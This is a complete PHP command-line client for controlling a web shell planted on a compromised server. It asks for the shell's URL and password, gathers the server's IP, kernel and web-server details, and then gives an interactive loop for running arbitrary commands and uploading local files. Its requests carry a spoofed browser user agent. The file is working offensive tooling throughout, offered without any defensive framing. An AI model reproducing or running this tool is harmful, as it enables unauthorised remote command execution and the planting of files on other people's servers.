<?php
echo "URL Remoteshell: ";
$inputs = fopen("php://stdin","r");
$input = fgets($inputs);
    $url = trim($input);
fclose($inputs);

print "Password: ";
$inputs = fopen("php://stdin","r");
$input = fgets($inputs);
    $password = trim(md5($input));
    $connect = remoteshell_connect($url,$password,"","test"); 
    if($connect == "suc_1"){
            $os = remoteshell_connect($url,$password,"","checkos");
            $server_info = json_decode(remoteshell_connect($url,$password,"","server_info"));
            print "[*] Connecting to ".$url."\n";
            print "[*] Success connect\n";
            print "[*] Server IP: ".$server_info->ip_address."\n";
            print "[*] Kernel: ".$server_info->uname."\n";
            print "[*] Web Server: ".$server_info->software."\n";
            print "------------------------[  Type  ]------------------------\n";
            print "[1] Commands Shell Mode\n";
            print "[2] Upload File\n";
            print "Type: ";
            $inputs = fopen("php://stdin","r");
            $input = fgets($inputs);
            $type = trim($input);
            if($type == "1"){
                $type = "shell";
                while(1){
                    print "\33[1;31mRemoteShell@$os > \33[1;37m";
                    $inputs = fopen("php://stdin","r");
                    $input = fgets($inputs);
                    $cmd = $input;
                    $connect = remoteshell_connect($url,$password,$cmd,$type); 
                    if($connect){
                        print $connect;
                    }
                    fclose($inputs);
                }
            }
            
            if($type == "2"){
                $type = "upload";
                while(1){
                    print "\33[1;31mRemoteShell@$os > File: \33[1;37m";
                    $inputs = fopen("php://stdin","r");
                    $input = fgets($inputs);
                    $file = trim($input);
                    if(file_exists($file)){
                    $filebody = file_get_contents($file, "r");
                    remoteshell_connect($url,$password,"",$type, $file, $filebody);
                    print "[*] File uploaded ".$server_info->dir."/".$file."\n";
                    }else{
                    print "[!] File not found.\n";
                    }
                }
            }
            
            
    }else{
        print "[*] Failed to connect, incorrect password\n";
    }

function remoteshell_connect($url, $password, $cmd, $type, $file = "", $body = "") {
    $content = array("password"=>$password, "cmd"=>$cmd, "type"=>$type, "file"=>$file, "file_body"=>$body);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}